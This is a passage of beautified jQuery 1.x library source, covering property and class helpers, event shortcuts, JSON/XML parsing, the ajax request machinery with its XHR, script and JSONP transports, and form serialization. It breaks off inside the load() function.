        jQuery.fn.extend({
            prop: function(name, value) {
                return access(this, jQuery.prop, name, value, arguments.length > 1)
            },
            removeProp: function(name) {
                name = jQuery.propFix[name] || name;
                return this.each(function() {
                    try {
                        this[name] = undefined;
                        delete this[name]
                    } catch (e) {}
                })
            }
        });
        jQuery.extend({
            propFix: {
                "for": "htmlFor",
                "class": "className"
            },
            prop: function(elem, name, value) {
                var ret, hooks, notxml, nType = elem.nodeType;
                if (!elem || nType === 3 || nType === 8 || nType === 2) {
                    return
                }
                notxml = nType !== 1 || !jQuery.isXMLDoc(elem);
                if (notxml) {
                    name = jQuery.propFix[name] || name;
                    hooks = jQuery.propHooks[name]
                }
                if (value !== undefined) {
                    return hooks && "set" in hooks && (ret = hooks.set(elem, value, name)) !== undefined ? ret : (elem[name] = value)
                } else {
                    return hooks && "get" in hooks && (ret = hooks.get(elem, name)) !== null ? ret : elem[name]
                }
            },
            propHooks: {
                tabIndex: {
                    get: function(elem) {
                        var tabindex = jQuery.find.attr(elem, "tabindex");
                        return tabindex ? parseInt(tabindex, 10) : rfocusable.test(elem.nodeName) || rclickable.test(elem.nodeName) && elem.href ? 0 : -1
                    }
                }
            }
        });
        if (!support.hrefNormalized) {
            jQuery.each(["href", "src"], function(i, name) {
                jQuery.propHooks[name] = {
                    get: function(elem) {
                        return elem.getAttribute(name, 4)
                    }
                }
            })
        }
        if (!support.optSelected) {
            jQuery.propHooks.selected = {
                get: function(elem) {
                    var parent = elem.parentNode;
                    if (parent) {
                        parent.selectedIndex;
                        if (parent.parentNode) {
                            parent.parentNode.selectedIndex
                        }
                    }
                    return null
                }
            }
        }
        jQuery.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
            jQuery.propFix[this.toLowerCase()] = this
        });
        if (!support.enctype) {
            jQuery.propFix.enctype = "encoding"
        }
        var rclass = /[\t\r\n\f]/g;
        jQuery.fn.extend({
            addClass: function(value) {
                var classes, elem, cur, clazz, j, finalValue, i = 0,
                    len = this.length,
                    proceed = typeof value === "string" && value;
                if (jQuery.isFunction(value)) {
                    return this.each(function(j) {
                        jQuery(this).addClass(value.call(this, j, this.className))
                    })
                }
                if (proceed) {
                    classes = (value || "").match(rnotwhite) || [];
                    for (; i < len; i++) {
                        elem = this[i];
                        cur = elem.nodeType === 1 && (elem.className ? (" " + elem.className + " ").replace(rclass, " ") : " ");
                        if (cur) {
                            j = 0;
                            while ((clazz = classes[j++])) {
                                if (cur.indexOf(" " + clazz + " ") < 0) {
                                    cur += clazz + " "
                                }
                            }
                            finalValue = jQuery.trim(cur);
                            if (elem.className !== finalValue) {
                                elem.className = finalValue
                            }
                        }
                    }
                }
                return this
            },
            removeClass: function(value) {
                var classes, elem, cur, clazz, j, finalValue, i = 0,
                    len = this.length,
                    proceed = arguments.length === 0 || typeof value === "string" && value;
                if (jQuery.isFunction(value)) {
                    return this.each(function(j) {
                        jQuery(this).removeClass(value.call(this, j, this.className))
                    })
                }
                if (proceed) {
                    classes = (value || "").match(rnotwhite) || [];
                    for (; i < len; i++) {
                        elem = this[i];
                        cur = elem.nodeType === 1 && (elem.className ? (" " + elem.className + " ").replace(rclass, " ") : "");
                        if (cur) {
                            j = 0;
                            while ((clazz = classes[j++])) {
                                while (cur.indexOf(" " + clazz + " ") >= 0) {
                                    cur = cur.replace(" " + clazz + " ", " ")
                                }
                            }
                            finalValue = value ? jQuery.trim(cur) : "";
                            if (elem.className !== finalValue) {
                                elem.className = finalValue
                            }
                        }
                    }
                }
                return this
            },
            toggleClass: function(value, stateVal) {
                var type = typeof value;
                if (typeof stateVal === "boolean" && type === "string") {
                    return stateVal ? this.addClass(value) : this.removeClass(value)
                }
                if (jQuery.isFunction(value)) {
                    return this.each(function(i) {
                        jQuery(this).toggleClass(value.call(this, i, this.className, stateVal), stateVal)
                    })
                }
                return this.each(function() {
                    if (type === "string") {
                        var className, i = 0,
                            self = jQuery(this),
                            classNames = value.match(rnotwhite) || [];
                        while ((className = classNames[i++])) {
                            if (self.hasClass(className)) {
                                self.removeClass(className)
                            } else {
                                self.addClass(className)
                            }
                        }
                    } else if (type === strundefined || type === "boolean") {
                        if (this.className) {
                            jQuery._data(this, "__className__", this.className)
                        }
                        this.className = this.className || value === false ? "" : jQuery._data(this, "__className__") || ""
                    }
                })
            },
            hasClass: function(selector) {
                var className = " " + selector + " ",
                    i = 0,
                    l = this.length;
                for (; i < l; i++) {
                    if (this[i].nodeType === 1 && (" " + this[i].className + " ").replace(rclass, " ").indexOf(className) >= 0) {
                        return true
                    }
                }
                return false
            }
        });
        jQuery.each(("blur focus focusin focusout load resize scroll unload click dblclick " + "mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " + "change select submit keydown keypress keyup error contextmenu").split(" "), function(i, name) {
            jQuery.fn[name] = function(data, fn) {
                return arguments.length > 0 ? this.on(name, null, data, fn) : this.trigger(name)
            }
        });
        jQuery.fn.extend({
            hover: function(fnOver, fnOut) {
                return this.mouseenter(fnOver).mouseleave(fnOut || fnOver)
            },
            bind: function(types, data, fn) {
                return this.on(types, null, data, fn)
            },
            unbind: function(types, fn) {
                return this.off(types, null, fn)
            },
            delegate: function(selector, types, data, fn) {
                return this.on(types, selector, data, fn)
            },
            undelegate: function(selector, types, fn) {
                return arguments.length === 1 ? this.off(selector, "**") : this.off(types, selector || "**", fn)
            }
        });
        var nonce = jQuery.now();
        var rquery = (/\?/);
        var rvalidtokens = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
        jQuery.parseJSON = function(data) {
            if (window.JSON && window.JSON.parse) {
                return window.JSON.parse(data + "")
            }
            var requireNonComma, depth = null,
                str = jQuery.trim(data + "");
            return str && !jQuery.trim(str.replace(rvalidtokens, function(token, comma, open, close) {
                if (requireNonComma && comma) {
                    depth = 0
                }
                if (depth === 0) {
                    return token
                }
                requireNonComma = open || comma;
                depth += !close - !open;
                return ""
            })) ? (Function("return " + str))() : jQuery.error("Invalid JSON: " + data)
        };
        jQuery.parseXML = function(data) {
            var xml, tmp;
            if (!data || typeof data !== "string") {
                return null
            }
            try {
                if (window.DOMParser) {
                    tmp = new DOMParser();
                    xml = tmp.parseFromString(data, "text/xml")
                } else {
                    xml = new ActiveXObject("Microsoft.XMLDOM");
                    xml.async = "false";
                    xml.loadXML(data)
                }
            } catch (e) {
                xml = undefined
            }
            if (!xml || !xml.documentElement || xml.getElementsByTagName("parsererror").length) {
                jQuery.error("Invalid XML: " + data)
            }
            return xml
        };
        var ajaxLocParts, ajaxLocation, rhash = /#.*$/,
            rts = /([?&])_=[^&]*/,
            rheaders = /^(.*?):[ \t]*([^\r\n]*)\r?$/mg,
            rlocalProtocol = /^(?:about|app|app-storage|.+-extension|file|res|widget):$/,
            rnoContent = /^(?:GET|HEAD)$/,
            rprotocol = /^\/\//,
            rurl = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,
            prefilters = {},
            transports = {},
            allTypes = "*/".concat("*");
        try {
            ajaxLocation = location.href
        } catch (e) {
            ajaxLocation = document.createElement("a");
            ajaxLocation.href = "";
            ajaxLocation = ajaxLocation.href
        }
        ajaxLocParts = rurl.exec(ajaxLocation.toLowerCase()) || [];

        function addToPrefiltersOrTransports(structure) {
            return function(dataTypeExpression, func) {
                if (typeof dataTypeExpression !== "string") {
                    func = dataTypeExpression;
                    dataTypeExpression = "*"
                }
                var dataType, i = 0,
                    dataTypes = dataTypeExpression.toLowerCase().match(rnotwhite) || [];
                if (jQuery.isFunction(func)) {
                    while ((dataType = dataTypes[i++])) {
                        if (dataType.charAt(0) === "+") {
                            dataType = dataType.slice(1) || "*";
                            (structure[dataType] = structure[dataType] || []).unshift(func)
                        } else {
                            (structure[dataType] = structure[dataType] || []).push(func)
                        }
                    }
                }
            }
        }

        function inspectPrefiltersOrTransports(structure, options, originalOptions, jqXHR) {
            var inspected = {},
                seekingTransport = (structure === transports);

            function inspect(dataType) {
                var selected;
                inspected[dataType] = true;
                jQuery.each(structure[dataType] || [], function(_, prefilterOrFactory) {
                    var dataTypeOrTransport = prefilterOrFactory(options, originalOptions, jqXHR);
                    if (typeof dataTypeOrTransport === "string" && !seekingTransport && !inspected[dataTypeOrTransport]) {
                        options.dataTypes.unshift(dataTypeOrTransport);
                        inspect(dataTypeOrTransport);
                        return false
                    } else if (seekingTransport) {
                        return !(selected = dataTypeOrTransport)
                    }
                });
                return selected
            }
            return inspect(options.dataTypes[0]) || !inspected["*"] && inspect("*")
        }

        function ajaxExtend(target, src) {
            var deep, key, flatOptions = jQuery.ajaxSettings.flatOptions || {};
            for (key in src) {
                if (src[key] !== undefined) {
                    (flatOptions[key] ? target : (deep || (deep = {})))[key] = src[key]
                }
            }
            if (deep) {
                jQuery.extend(true, target, deep)
            }
            return target
        }

        function ajaxHandleResponses(s, jqXHR, responses) {
            var firstDataType, ct, finalDataType, type, contents = s.contents,
                dataTypes = s.dataTypes;
            while (dataTypes[0] === "*") {
                dataTypes.shift();
                if (ct === undefined) {
                    ct = s.mimeType || jqXHR.getResponseHeader("Content-Type")
                }
            }
            if (ct) {
                for (type in contents) {
                    if (contents[type] && contents[type].test(ct)) {
                        dataTypes.unshift(type);
                        break
                    }
                }
            }
            if (dataTypes[0] in responses) {
                finalDataType = dataTypes[0]
            } else {
                for (type in responses) {
                    if (!dataTypes[0] || s.converters[type + " " + dataTypes[0]]) {
                        finalDataType = type;
                        break
                    }
                    if (!firstDataType) {
                        firstDataType = type
                    }
                }
                finalDataType = finalDataType || firstDataType
            }
            if (finalDataType) {
                if (finalDataType !== dataTypes[0]) {
                    dataTypes.unshift(finalDataType)
                }
                return responses[finalDataType]
            }
        }

        function ajaxConvert(s, response, jqXHR, isSuccess) {
            var conv2, current, conv, tmp, prev, converters = {},
                dataTypes = s.dataTypes.slice();
            if (dataTypes[1]) {
                for (conv in s.converters) {
                    converters[conv.toLowerCase()] = s.converters[conv]
                }
            }
            current = dataTypes.shift();
            while (current) {
                if (s.responseFields[current]) {
                    jqXHR[s.responseFields[current]] = response
                }
                if (!prev && isSuccess && s.dataFilter) {
                    response = s.dataFilter(response, s.dataType)
                }
                prev = current;
                current = dataTypes.shift();
                if (current) {
                    if (current === "*") {
                        current = prev
                    } else if (prev !== "*" && prev !== current) {
                        conv = converters[prev + " " + current] || converters["* " + current];
                        if (!conv) {
                            for (conv2 in converters) {
                                tmp = conv2.split(" ");
                                if (tmp[1] === current) {
                                    conv = converters[prev + " " + tmp[0]] || converters["* " + tmp[0]];
                                    if (conv) {
                                        if (conv === true) {
                                            conv = converters[conv2]
                                        } else if (converters[conv2] !== true) {
                                            current = tmp[0];
                                            dataTypes.unshift(tmp[1])
                                        }
                                        break
                                    }
                                }
                            }
                        }
                        if (conv !== true) {
                            if (conv && s["throws"]) {
                                response = conv(response)
                            } else {
                                try {
                                    response = conv(response)
                                } catch (e) {
                                    return {
                                        state: "parsererror",
                                        error: conv ? e : "No conversion from " + prev + " to " + current
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return {
                state: "success",
                data: response
            }
        }
        jQuery.extend({
            active: 0,
            lastModified: {},
            etag: {},
            ajaxSettings: {
                url: ajaxLocation,
                type: "GET",
                isLocal: rlocalProtocol.test(ajaxLocParts[1]),
                global: true,
                processData: true,
                async: true,
                contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                accepts: {
                    "*": allTypes,
                    text: "text/plain",
                    html: "text/html",
                    xml: "application/xml, text/xml",
                    json: "application/json, text/javascript"
                },
                contents: {
                    xml: /xml/,
                    html: /html/,
                    json: /json/
                },
                responseFields: {
                    xml: "responseXML",
                    text: "responseText",
                    json: "responseJSON"
                },
                converters: {
                    "* text": String,
                    "text html": true,
                    "text json": jQuery.parseJSON,
                    "text xml": jQuery.parseXML
                },
                flatOptions: {
                    url: true,
                    context: true
                }
            },
            ajaxSetup: function(target, settings) {
                return settings ? ajaxExtend(ajaxExtend(target, jQuery.ajaxSettings), settings) : ajaxExtend(jQuery.ajaxSettings, target)
            },
            ajaxPrefilter: addToPrefiltersOrTransports(prefilters),
            ajaxTransport: addToPrefiltersOrTransports(transports),
            ajax: function(url, options) {
                if (typeof url === "object") {
                    options = url;
                    url = undefined
                }
                options = options || {};
                var parts, i, cacheURL, responseHeadersString, timeoutTimer, fireGlobals, transport, responseHeaders, s = jQuery.ajaxSetup({}, options),
                    callbackContext = s.context || s,
                    globalEventContext = s.context && (callbackContext.nodeType || callbackContext.jquery) ? jQuery(callbackContext) : jQuery.event,
                    deferred = jQuery.Deferred(),
                    completeDeferred = jQuery.Callbacks("once memory"),
                    statusCode = s.statusCode || {},
                    requestHeaders = {},
                    requestHeadersNames = {},
                    state = 0,
                    strAbort = "canceled",
                    jqXHR = {
                        readyState: 0,
                        getResponseHeader: function(key) {
                            var match;
                            if (state === 2) {
                                if (!responseHeaders) {
                                    responseHeaders = {};
                                    while ((match = rheaders.exec(responseHeadersString))) {
                                        responseHeaders[match[1].toLowerCase()] = match[2]
                                    }
                                }
                                match = responseHeaders[key.toLowerCase()]
                            }
                            return match == null ? null : match
                        },
                        getAllResponseHeaders: function() {
                            return state === 2 ? responseHeadersString : null
                        },
                        setRequestHeader: function(name, value) {
                            var lname = name.toLowerCase();
                            if (!state) {
                                name = requestHeadersNames[lname] = requestHeadersNames[lname] || name;
                                requestHeaders[name] = value
                            }
                            return this
                        },
                        overrideMimeType: function(type) {
                            if (!state) {
                                s.mimeType = type
                            }
                            return this
                        },
                        statusCode: function(map) {
                            var code;
                            if (map) {
                                if (state < 2) {
                                    for (code in map) {
                                        statusCode[code] = [statusCode[code], map[code]]
                                    }
                                } else {
                                    jqXHR.always(map[jqXHR.status])
                                }
                            }
                            return this
                        },
                        abort: function(statusText) {
                            var finalText = statusText || strAbort;
                            if (transport) {
                                transport.abort(finalText)
                            }
                            done(0, finalText);
                            return this
                        }
                    };
                deferred.promise(jqXHR).complete = completeDeferred.add;
                jqXHR.success = jqXHR.done;
                jqXHR.error = jqXHR.fail;
                s.url = ((url || s.url || ajaxLocation) + "").replace(rhash, "").replace(rprotocol, ajaxLocParts[1] + "//");
                s.type = options.method || options.type || s.method || s.type;
                s.dataTypes = jQuery.trim(s.dataType || "*").toLowerCase().match(rnotwhite) || [""];
                if (s.crossDomain == null) {
                    parts = rurl.exec(s.url.toLowerCase());
                    s.crossDomain = !!(parts && (parts[1] !== ajaxLocParts[1] || parts[2] !== ajaxLocParts[2] || (parts[3] || (parts[1] === "http:" ? "80" : "443")) !== (ajaxLocParts[3] || (ajaxLocParts[1] === "http:" ? "80" : "443"))))
                }
                if (s.data && s.processData && typeof s.data !== "string") {
                    s.data = jQuery.param(s.data, s.traditional)
                }
                inspectPrefiltersOrTransports(prefilters, s, options, jqXHR);
                if (state === 2) {
                    return jqXHR
                }
                fireGlobals = jQuery.event && s.global;
                if (fireGlobals && jQuery.active++ === 0) {
                    jQuery.event.trigger("ajaxStart")
                }
                s.type = s.type.toUpperCase();
                s.hasContent = !rnoContent.test(s.type);
                cacheURL = s.url;
                if (!s.hasContent) {
                    if (s.data) {
                        cacheURL = (s.url += (rquery.test(cacheURL) ? "&" : "?") + s.data);
                        delete s.data
                    }
                    if (s.cache === false) {
                        s.url = rts.test(cacheURL) ? cacheURL.replace(rts, "$1_=" + nonce++) : cacheURL + (rquery.test(cacheURL) ? "&" : "?") + "_=" + nonce++
                    }
                }
                if (s.ifModified) {
                    if (jQuery.lastModified[cacheURL]) {
                        jqXHR.setRequestHeader("If-Modified-Since", jQuery.lastModified[cacheURL])
                    }
                    if (jQuery.etag[cacheURL]) {
                        jqXHR.setRequestHeader("If-None-Match", jQuery.etag[cacheURL])
                    }
                }
                if (s.data && s.hasContent && s.contentType !== false || options.contentType) {
                    jqXHR.setRequestHeader("Content-Type", s.contentType)
                }
                jqXHR.setRequestHeader("Accept", s.dataTypes[0] && s.accepts[s.dataTypes[0]] ? s.accepts[s.dataTypes[0]] + (s.dataTypes[0] !== "*" ? ", " + allTypes + "; q=0.01" : "") : s.accepts["*"]);
                for (i in s.headers) {
                    jqXHR.setRequestHeader(i, s.headers[i])
                }
                if (s.beforeSend && (s.beforeSend.call(callbackContext, jqXHR, s) === false || state === 2)) {
                    return jqXHR.abort()
                }
                strAbort = "abort";
                for (i in {
                        success: 1,
                        error: 1,
                        complete: 1
                    }) {
                    jqXHR[i](s[i])
                }
                transport = inspectPrefiltersOrTransports(transports, s, options, jqXHR);
                if (!transport) {
                    done(-1, "No Transport")
                } else {
                    jqXHR.readyState = 1;
                    if (fireGlobals) {
                        globalEventContext.trigger("ajaxSend", [jqXHR, s])
                    }
                    if (s.async && s.timeout > 0) {
                        timeoutTimer = setTimeout(function() {
                            jqXHR.abort("timeout")
                        }, s.timeout)
                    }
                    try {
                        state = 1;
                        transport.send(requestHeaders, done)
                    } catch (e) {
                        if (state < 2) {
                            done(-1, e)
                        } else {
                            throw e;
                        }
                    }
                }

                function done(status, nativeStatusText, responses, headers) {
                    var isSuccess, success, error, response, modified, statusText = nativeStatusText;
                    if (state === 2) {
                        return
                    }
                    state = 2;
                    if (timeoutTimer) {
                        clearTimeout(timeoutTimer)
                    }
                    transport = undefined;
                    responseHeadersString = headers || "";
                    jqXHR.readyState = status > 0 ? 4 : 0;
                    isSuccess = status >= 200 && status < 300 || status === 304;
                    if (responses) {
                        response = ajaxHandleResponses(s, jqXHR, responses)
                    }
                    response = ajaxConvert(s, response, jqXHR, isSuccess);
                    if (isSuccess) {
                        if (s.ifModified) {
                            modified = jqXHR.getResponseHeader("Last-Modified");
                            if (modified) {
                                jQuery.lastModified[cacheURL] = modified
                            }
                            modified = jqXHR.getResponseHeader("etag");
                            if (modified) {
                                jQuery.etag[cacheURL] = modified
                            }
                        }
                        if (status === 204 || s.type === "HEAD") {
                            statusText = "nocontent"
                        } else if (status === 304) {
                            statusText = "notmodified"
                        } else {
                            statusText = response.state;
                            success = response.data;
                            error = response.error;
                            isSuccess = !error
                        }
                    } else {
                        error = statusText;
                        if (status || !statusText) {
                            statusText = "error";
                            if (status < 0) {
                                status = 0
                            }
                        }
                    }
                    jqXHR.status = status;
                    jqXHR.statusText = (nativeStatusText || statusText) + "";
                    if (isSuccess) {
                        deferred.resolveWith(callbackContext, [success, statusText, jqXHR])
                    } else {
                        deferred.rejectWith(callbackContext, [jqXHR, statusText, error])
                    }
                    jqXHR.statusCode(statusCode);
                    statusCode = undefined;
                    if (fireGlobals) {
                        globalEventContext.trigger(isSuccess ? "ajaxSuccess" : "ajaxError", [jqXHR, s, isSuccess ? success : error])
                    }
                    completeDeferred.fireWith(callbackContext, [jqXHR, statusText]);
                    if (fireGlobals) {
                        globalEventContext.trigger("ajaxComplete", [jqXHR, s]);
                        if (!(--jQuery.active)) {
                            jQuery.event.trigger("ajaxStop")
                        }
                    }
                }
                return jqXHR
            },
            getJSON: function(url, data, callback) {
                return jQuery.get(url, data, callback, "json")
            },
            getScript: function(url, callback) {
                return jQuery.get(url, undefined, callback, "script")
            }
        });
        jQuery.each(["get", "post"], function(i, method) {
            jQuery[method] = function(url, data, callback, type) {
                if (jQuery.isFunction(data)) {
                    type = type || callback;
                    callback = data;
                    data = undefined
                }
                return jQuery.ajax({
                    url: url,
                    type: method,
                    dataType: type,
                    data: data,
                    success: callback
                })
            }
        });
        jQuery._evalUrl = function(url) {
            return jQuery.ajax({
                url: url,
                type: "GET",
                dataType: "script",
                async: false,
                global: false,
                "throws": true
            })
        };
        jQuery.fn.extend({
            wrapAll: function(html) {
                if (jQuery.isFunction(html)) {
                    return this.each(function(i) {
                        jQuery(this).wrapAll(html.call(this, i))
                    })
                }
                if (this[0]) {
                    var wrap = jQuery(html, this[0].ownerDocument).eq(0).clone(true);
                    if (this[0].parentNode) {
                        wrap.insertBefore(this[0])
                    }
                    wrap.map(function() {
                        var elem = this;
                        while (elem.firstChild && elem.firstChild.nodeType === 1) {
                            elem = elem.firstChild
                        }
                        return elem
                    }).append(this)
                }
                return this
            },
            wrapInner: function(html) {
                if (jQuery.isFunction(html)) {
                    return this.each(function(i) {
                        jQuery(this).wrapInner(html.call(this, i))
                    })
                }
                return this.each(function() {
                    var self = jQuery(this),
                        contents = self.contents();
                    if (contents.length) {
                        contents.wrapAll(html)
                    } else {
                        self.append(html)
                    }
                })
            },
            wrap: function(html) {
                var isFunction = jQuery.isFunction(html);
                return this.each(function(i) {
                    jQuery(this).wrapAll(isFunction ? html.call(this, i) : html)
                })
            },
            unwrap: function() {
                return this.parent().each(function() {
                    if (!jQuery.nodeName(this, "body")) {
                        jQuery(this).replaceWith(this.childNodes)
                    }
                }).end()
            }
        });
        jQuery.expr.filters.hidden = function(elem) {
            return elem.offsetWidth <= 0 && elem.offsetHeight <= 0 || (!support.reliableHiddenOffsets() && ((elem.style && elem.style.display) || jQuery.css(elem, "display")) === "none")
        };
        jQuery.expr.filters.visible = function(elem) {
            return !jQuery.expr.filters.hidden(elem)
        };
        var r20 = /%20/g,
            rbracket = /\[\]$/,
            rCRLF = /\r?\n/g,
            rsubmitterTypes = /^(?:submit|button|image|reset|file)$/i,
            rsubmittable = /^(?:input|select|textarea|keygen)/i;

        function buildParams(prefix, obj, traditional, add) {
            var name;
            if (jQuery.isArray(obj)) {
                jQuery.each(obj, function(i, v) {
                    if (traditional || rbracket.test(prefix)) {
                        add(prefix, v)
                    } else {
                        buildParams(prefix + "[" + (typeof v === "object" ? i : "") + "]", v, traditional, add)
                    }
                })
            } else if (!traditional && jQuery.type(obj) === "object") {
                for (name in obj) {
                    buildParams(prefix + "[" + name + "]", obj[name], traditional, add)
                }
            } else {
                add(prefix, obj)
            }
        }
        jQuery.param = function(a, traditional) {
            var prefix, s = [],
                add = function(key, value) {
                    value = jQuery.isFunction(value) ? value() : (value == null ? "" : value);
                    s[s.length] = encodeURIComponent(key) + "=" + encodeURIComponent(value)
                };
            if (traditional === undefined) {
                traditional = jQuery.ajaxSettings && jQuery.ajaxSettings.traditional
            }
            if (jQuery.isArray(a) || (a.jquery && !jQuery.isPlainObject(a))) {
                jQuery.each(a, function() {
                    add(this.name, this.value)
                })
            } else {
                for (prefix in a) {
                    buildParams(prefix, a[prefix], traditional, add)
                }
            }
            return s.join("&").replace(r20, "+")
        };
        jQuery.fn.extend({
            serialize: function() {
                return jQuery.param(this.serializeArray())
            },
            serializeArray: function() {
                return this.map(function() {
                    var elements = jQuery.prop(this, "elements");
                    return elements ? jQuery.makeArray(elements) : this
                }).filter(function() {
                    var type = this.type;
                    return this.name && !jQuery(this).is(":disabled") && rsubmittable.test(this.nodeName) && !rsubmitterTypes.test(type) && (this.checked || !rcheckableType.test(type))
                }).map(function(i, elem) {
                    var val = jQuery(this).val();
                    return val == null ? null : jQuery.isArray(val) ? jQuery.map(val, function(val) {
                        return {
                            name: elem.name,
                            value: val.replace(rCRLF, "\r\n")
                        }
                    }) : {
                        name: elem.name,
                        value: val.replace(rCRLF, "\r\n")
                    }
                }).get()
            }
        });
        jQuery.ajaxSettings.xhr = window.ActiveXObject !== undefined ? function() {
            return !this.isLocal && /^(get|post|head|put|delete|options)$/i.test(this.type) && createStandardXHR() || createActiveXHR()
        } : createStandardXHR;
        var xhrId = 0,
            xhrCallbacks = {},
            xhrSupported = jQuery.ajaxSettings.xhr();
        if (window.attachEvent) {
            window.attachEvent("onunload", function() {
                for (var key in xhrCallbacks) {
                    xhrCallbacks[key](undefined, true)
                }
            })
        }
        support.cors = !!xhrSupported && ("withCredentials" in xhrSupported);
        xhrSupported = support.ajax = !!xhrSupported;
        if (xhrSupported) {
            jQuery.ajaxTransport(function(options) {
                if (!options.crossDomain || support.cors) {
                    var callback;
                    return {
                        send: function(headers, complete) {
                            var i, xhr = options.xhr(),
                                id = ++xhrId;
                            xhr.open(options.type, options.url, options.async, options.username, options.password);
                            if (options.xhrFields) {
                                for (i in options.xhrFields) {
                                    xhr[i] = options.xhrFields[i]
                                }
                            }
                            if (options.mimeType && xhr.overrideMimeType) {
                                xhr.overrideMimeType(options.mimeType)
                            }
                            if (!options.crossDomain && !headers["X-Requested-With"]) {
                                headers["X-Requested-With"] = "XMLHttpRequest"
                            }
                            for (i in headers) {
                                if (headers[i] !== undefined) {
                                    xhr.setRequestHeader(i, headers[i] + "")
                                }
                            }
                            xhr.send((options.hasContent && options.data) || null);
                            callback = function(_, isAbort) {
                                var status, statusText, responses;
                                if (callback && (isAbort || xhr.readyState === 4)) {
                                    delete xhrCallbacks[id];
                                    callback = undefined;
                                    xhr.onreadystatechange = jQuery.noop;
                                    if (isAbort) {
                                        if (xhr.readyState !== 4) {
                                            xhr.abort()
                                        }
                                    } else {
                                        responses = {};
                                        status = xhr.status;
                                        if (typeof xhr.responseText === "string") {
                                            responses.text = xhr.responseText
                                        }
                                        try {
                                            statusText = xhr.statusText
                                        } catch (e) {
                                            statusText = ""
                                        }
                                        if (!status && options.isLocal && !options.crossDomain) {
                                            status = responses.text ? 200 : 404
                                        } else if (status === 1223) {
                                            status = 204
                                        }
                                    }
                                }
                                if (responses) {
                                    complete(status, statusText, responses, xhr.getAllResponseHeaders())
                                }
                            };
                            if (!options.async) {
                                callback()
                            } else if (xhr.readyState === 4) {
                                setTimeout(callback)
                            } else {
                                xhr.onreadystatechange = xhrCallbacks[id] = callback
                            }
                        },
                        abort: function() {
                            if (callback) {
                                callback(undefined, true)
                            }
                        }
                    }
                }
            })
        }
        function createStandardXHR() {
            try {
                return new window.XMLHttpRequest()
            } catch (e) {}
        }

        function createActiveXHR() {
            try {
                return new window.ActiveXObject("Microsoft.XMLHTTP")
            } catch (e) {}
        }
        jQuery.ajaxSetup({
            accepts: {
                script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
            },
            contents: {
                script: /(?:java|ecma)script/
            },
            converters: {
                "text script": function(text) {
                    jQuery.globalEval(text);
                    return text
                }
            }
        });
        jQuery.ajaxPrefilter("script", function(s) {
            if (s.cache === undefined) {
                s.cache = false
            }
            if (s.crossDomain) {
                s.type = "GET";
                s.global = false
            }
        });
        jQuery.ajaxTransport("script", function(s) {
            if (s.crossDomain) {
                var script, head = document.head || jQuery("head")[0] || document.documentElement;
                return {
                    send: function(_, callback) {
                        script = document.createElement("script");
                        script.async = true;
                        if (s.scriptCharset) {
                            script.charset = s.scriptCharset
                        }
                        script.src = s.url;
                        script.onload = script.onreadystatechange = function(_, isAbort) {
                            if (isAbort || !script.readyState || /loaded|complete/.test(script.readyState)) {
                                script.onload = script.onreadystatechange = null;
                                if (script.parentNode) {
                                    script.parentNode.removeChild(script)
                                }
                                script = null;
                                if (!isAbort) {
                                    callback(200, "success")
                                }
                            }
                        };
                        head.insertBefore(script, head.firstChild)
                    },
                    abort: function() {
                        if (script) {
                            script.onload(undefined, true)
                        }
                    }
                }
            }
        });
        var oldCallbacks = [],
            rjsonp = /(=)\?(?=&|$)|\?\?/;
        jQuery.ajaxSetup({
            jsonp: "callback",
            jsonpCallback: function() {
                var callback = oldCallbacks.pop() || (jQuery.expando + "_" + (nonce++));
                this[callback] = true;
                return callback
            }
        });
        jQuery.ajaxPrefilter("json jsonp", function(s, originalSettings, jqXHR) {
            var callbackName, overwritten, responseContainer, jsonProp = s.jsonp !== false && (rjsonp.test(s.url) ? "url" : typeof s.data === "string" && !(s.contentType || "").indexOf("application/x-www-form-urlencoded") && rjsonp.test(s.data) && "data");
            if (jsonProp || s.dataTypes[0] === "jsonp") {
                callbackName = s.jsonpCallback = jQuery.isFunction(s.jsonpCallback) ? s.jsonpCallback() : s.jsonpCallback;
                if (jsonProp) {
                    s[jsonProp] = s[jsonProp].replace(rjsonp, "$1" + callbackName)
                } else if (s.jsonp !== false) {
                    s.url += (rquery.test(s.url) ? "&" : "?") + s.jsonp + "=" + callbackName
                }
                s.converters["script json"] = function() {
                    if (!responseContainer) {
                        jQuery.error(callbackName + " was not called")
                    }
                    return responseContainer[0]
                };
                s.dataTypes[0] = "json";
                overwritten = window[callbackName];
                window[callbackName] = function() {
                    responseContainer = arguments
                };
                jqXHR.always(function() {
                    window[callbackName] = overwritten;
                    if (s[callbackName]) {
                        s.jsonpCallback = originalSettings.jsonpCallback;
                        oldCallbacks.push(callbackName)
                    }
                    if (responseContainer && jQuery.isFunction(overwritten)) {
                        overwritten(responseContainer[0])
                    }
                    responseContainer = overwritten = undefined
                });
                return "script"
            }
        });
        jQuery.parseHTML = function(data, context, keepScripts) {
            if (!data || typeof data !== "string") {
                return null
            }
            if (typeof context === "boolean") {
                keepScripts = context;
                context = false
            }
            context = context || document;
            var parsed = rsingleTag.exec(data),
                scripts = !keepScripts && [];
            if (parsed) {
                return [context.createElement(parsed[1])]
            }
            parsed = jQuery.buildFragment([data], context, scripts);
            if (scripts && scripts.length) {
                jQuery(scripts).remove()
            }
            return jQuery.merge([], parsed.childNodes)
        };
        var _load = jQuery.fn.load;
        jQuery.fn.load = function(url, params, callback) {
            if (typeof url !== "string" && _load) {
                return _load.apply(this, arguments)
            }
            var selector, response, type, self = this,
                off = url.indexOf(" ");
            if (off >= 0) {
                selector = jQuery.trim(url.slice(off, url.length));
                url = url.slice(0, off)
            }
            if (jQuery.isFunction(params)) {
                callback = params;
                params = undefined
            } else if (params && typeof params === "object") {
                type = "POST"
            }
            if (self.length > 0) {
                jQuery.ajax({
                    url: url,
                    type: type,
                    dataType: "html",
                    data: params
                }).done(function(responseText) {
                    response = arguments;
                    self.html(selector ? jQuery("<div>").append(jQuery.parseHTML(responseText)).find(selector) : responseText)
